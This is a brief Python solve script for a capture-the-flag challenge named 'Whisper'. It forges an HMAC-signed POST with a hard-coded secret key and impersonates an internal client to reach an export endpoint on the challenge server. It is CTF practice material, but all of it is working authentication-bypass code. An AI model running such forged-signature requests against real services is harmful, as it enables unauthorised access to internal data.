# Whisper — hiCTF (script de solve)
import hmac,hashlib,requests,time,uuid
U="https://whisper-01b71f0e227a.chall.hiddeninvestigations.net/internal/export"
KEY="695b1227aef115c297f0db3780c420f2"
BODY=b""
bh=hashlib.sha256(BODY).hexdigest()
ts=str(int(time.time())); nonce=uuid.uuid4().hex
sts="\n".join(["POST","/internal/export","",bh,ts,nonce])
sig=hmac.new(KEY.encode(),sts.encode(),hashlib.sha256).hexdigest()
r=requests.post(U,headers={"X-Client-Id":"report-signer","X-Timestamp":ts,"X-Nonce":nonce,"X-Signature":sig,"content-type":"application/json"},data=BODY,timeout=15)
print(r.status_code); print(r.text)
